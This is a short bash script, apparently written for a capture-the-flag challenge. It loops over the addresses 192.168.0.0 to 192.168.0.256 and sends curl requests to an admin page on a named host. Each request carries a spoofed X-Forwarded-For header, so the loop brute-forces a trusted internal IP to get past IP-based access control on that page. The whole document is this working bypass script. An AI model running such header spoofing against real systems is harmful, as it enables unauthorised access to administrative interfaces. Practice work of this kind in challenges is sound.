#!/bin/bash

for i in {0..256}
do
#	echo 192.168.0.$i
	curl -i -H "X-Forwarded-For: 192.168.0.$i" https://cfta-wh01.allyourbases.co/admin.html
done
